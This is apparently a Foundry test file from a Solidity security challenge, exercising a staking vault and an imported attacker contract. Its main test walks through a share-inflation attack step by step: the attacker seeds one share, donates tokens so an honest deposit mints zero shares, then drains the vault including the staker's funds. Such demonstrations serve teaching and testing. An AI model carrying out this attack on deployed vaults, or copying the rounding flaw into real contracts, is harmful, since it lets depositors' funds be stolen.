// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {StakingVault4626} from "../src/challenges/StakingVault4626.sol";
import {VaultInflationAttacker} from "../src/attackers/VaultInflationAttacker.sol";
import {ERC20Mintable} from "../src/tokens/ERC20Mintable.sol";

contract VaultChallengeTest is Test {
    StakingVault4626 internal vault;
    VaultInflationAttacker internal attacker;
    ERC20Mintable internal token;
    address internal deployer;
    address internal staker;
    address internal attackerEoa;

    uint256 internal constant STAKER_DEPOSIT = 100 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        staker = makeAddr("staker");
        attackerEoa = makeAddr("attackerEoa");

        vm.startPrank(deployer);
        token = new ERC20Mintable("Staking Token", "STK");
        token.mint(staker, STAKER_DEPOSIT);
        vault = new StakingVault4626(address(token), "Staking Vault", "svSTK");
        vm.stopPrank();

        vm.prank(attackerEoa);
        attacker = new VaultInflationAttacker(address(vault));
        vm.prank(deployer);
        token.mint(address(attacker), 1_000 ether); // attacker working capital
    }

    function test_vaultStartsEmpty() public view {
        assertEq(vault.totalSupply(), 0, "vault starts with no shares");
        assertEq(token.balanceOf(address(vault)), 0, "vault starts with no assets");
    }

    function test_honestDepositGetsFairShares() public {
        vm.startPrank(staker);
        token.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(STAKER_DEPOSIT, staker);
        vm.stopPrank();
        assertEq(shares, STAKER_DEPOSIT, "first honest depositor gets 1:1");
    }

    function test_shareInflationDrain() public {
        // 1. Attacker inflates: seed supply with 1 wei, donate 200 tokens —
        //    twice the honest deposit, so late mints round to zero.
        vm.prank(attackerEoa);
        attacker.inflate(200 ether);
        assertEq(vault.totalSupply(), 1, "supply seeded with exactly 1 share");

        // 2. Honest staker deposits AFTER inflation — rounds down to 0 shares.
        vm.startPrank(staker);
        token.approve(address(vault), type(uint256).max);
        uint256 stakerShares = vault.deposit(STAKER_DEPOSIT, staker);
        vm.stopPrank();
        assertEq(stakerShares, 0, "inflated vault mints the staker zero shares");

        // 3. Attacker redeems the single share and walks away with everything.
        vm.prank(attackerEoa);
        attacker.harvest();
        // The single seeded share redeems the whole vault: donation + staker's
        // 100 tokens (+ the 1-wei seed itself).
        assertGe(token.balanceOf(attackerEoa), 200 ether + STAKER_DEPOSIT, "attacker captured donation + staker deposit");
        assertEq(token.balanceOf(address(vault)), 0, "vault emptied");
        assertEq(token.balanceOf(staker), 0, "staker lost their deposit");
    }
}
